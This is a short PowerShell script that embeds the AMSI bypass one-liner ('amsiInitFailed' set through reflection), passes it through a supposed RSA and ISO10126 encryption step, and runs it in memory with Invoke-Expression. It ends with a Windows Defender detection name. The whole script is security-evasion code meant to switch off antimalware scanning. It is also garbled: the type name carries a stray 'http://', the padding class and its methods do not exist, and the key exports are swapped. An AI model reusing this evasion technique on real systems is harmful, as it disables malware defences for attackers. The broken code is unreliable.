#Generate RSA key pair
$RSA = New-Object System.Security.Cryptography.RSACryptoServiceProvider

# Get the public and private key for encryption and decryption
$PublicKey = $RSA.ExportParameters( $True )
$PrivateKey = $RSA.ExportParameters( $False )

# Encode the script using RSA and ISO10126 padding
$script = "[Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
$encodedScript = [System.Text.Encoding]::Unicode.GetBytes($script)

$isoPad = New-Object System.Security.Cryptography.ISO10126Pad
$encryptedScript = $isoPad.Encrypt($encodedScript, $PublicKey)

# Decode the script in memory
$decryptedScript = $isoPad.Decrypt($encryptedScript, $PrivateKey)
$decodedScript = [System.Text.Encoding]::Unicode.GetString($decryptedScript)

# To run the decoded script in memory, you can use the Invoke-Expression cmdlet
Invoke-Expression $decodedScript

#Detection Name : Trojan:Win32/AmsiTamper.A!ams 
